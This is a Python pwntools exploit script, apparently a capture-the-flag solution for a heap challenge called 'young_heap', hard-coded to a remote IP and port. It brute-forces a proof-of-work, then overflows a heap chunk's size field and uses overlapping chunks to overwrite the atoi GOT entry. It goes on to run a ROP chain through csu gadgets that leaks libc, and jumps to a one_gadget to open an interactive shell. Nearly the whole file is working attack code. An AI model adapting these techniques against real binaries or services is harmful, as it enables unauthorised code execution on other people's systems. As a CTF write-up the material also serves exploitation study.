#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
from pwnlib.util.iters import bruteforce
from parse import *
import string
from hashlib import sha256

context.log_level="debug"
pwn_file="./young_heap"
libc="./libc.so.6"
elf=ELF(pwn_file)
libc=ELF(libc)
pid=0



if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("47.89.11.82",10009)
    def brute_force(prefix,s):
        return bruteforce(lambda x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=4)

    data=conn.recvline(keepends=False)
    prefix,s=parse("sha256(xxxx+{}) == {}",data)
    conn.sendline(brute_force(prefix,s))
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def add_heap(size,content):
    conn.sendlineafter(">> ","1")
    conn.sendlineafter("Size :",str(size))
    conn.sendafter("Content :",content)

def edit_heap(index,content):
    conn.sendlineafter(">> ","2")
    conn.sendlineafter("Index of heap :",str(index))
    conn.sendafter("Content :",content)

def del_heap(index):
    conn.sendlineafter(">> ","3")
    conn.sendlineafter("Index of heap :",str(index))




add_heap(0x300,"a")#0
add_heap(0x100,"a"*0x100)#1
add_heap(0x300,"a")#2
add_heap(0x10,"a")# 3
edit_heap(1,"a"*0x100+p64(0x421)[:2])
del_heap(0)
del_heap(2)
f={
        0x2b0:p64(0x1),
        0x2b8:p64(0x50),
        0x300:p64(0x51),
        0x308:p64(0xa0),
}
add_heap(0x350,fit(f,filler="a"))
del_heap(1)
# override left chunk size
payload="a"*0x40+p64(0x362)+p64(0xffffffff)
add_heap(0x90,payload)
# 0x102ea0


distance=0x105000# the distance between two mmaps is unknow, exploite it
# distance=0x100000
fake_chunk=0x6020d8

add_heap(distance-0x160,"a"*0x3f0+p64(fake_chunk))#2
add_heap(0x100,p64(fake_chunk)+p64(elf.got["atoi"]-0x10))
# payload in bss
f={
    0x20:p64(0x400E42),# pop;ret
}

add_heap(0x220,fit(f,filler="\x00"))

del_heap(2)
add_heap(0xffea0,"a"*0x3f0+p64(elf.got["atoi"]-0x10))
add_heap(0x228,p64(0x400B3F))# change atoi got


conn.sendlineafter(">> ","12")
new_bss=0x602300
sleep(0.1)

# leak libc
# jump gadget
f={
    0x8:p64(0x400E3A),# ret to csu
    0x10:p64(0),#rbx
    0x18:p64(0x6020f8),# rbp
    0x20:p64(0x30+fake_chunk),# r12 pop;ret
    0x28:p64(0),# r13 rdx
    0x30:p64(0),# r14 rsi
    0x38:p64(elf.got["read"]),# r15 rdi
    0x40:p64(0x400E20),# call [r12(pop;ret)] to set args
    0x48:p64(elf.symbols["puts"]),# call puts

    # read
    0x50:p64(0x400E3A),# 
    0x58:p64(0),# rbx
    0x60:p64(0x6020f8),# rbp
    0x68:p64(0x30+fake_chunk),# r12 pop;ret
    0x70:p64(0x8),# rdx
    0x78:p64(new_bss),# rsi
    0x80:p64(0),# rdi
    0x88:p64(0x400E20),# call [r12 pop;ret]
    0x90:p64(elf.symbols["read"]),

    0x98:p64(0x400E3A),# 
    0xa0:p64(0),#rbx
    0xa8:p64(0x6020f8),#rbp
    0xb0:p64(new_bss),#r12
    0xb8:p64(0),
    0xc0:p64(0),
    0xc8:p64(0),
    0xd0:p64(0x400E20),# call [r12(pop;ret)]
    0xd0+0x70:p64(0),
}
# stackoverflow
conn.send(fit(f,filler="\x00"))
libc_address=u64(conn.recvline()[:-1].ljust(8,"\x00"))-libc.symbols["read"]
conn.send(p64(0xf02a4+libc_address))
conn.interactive()

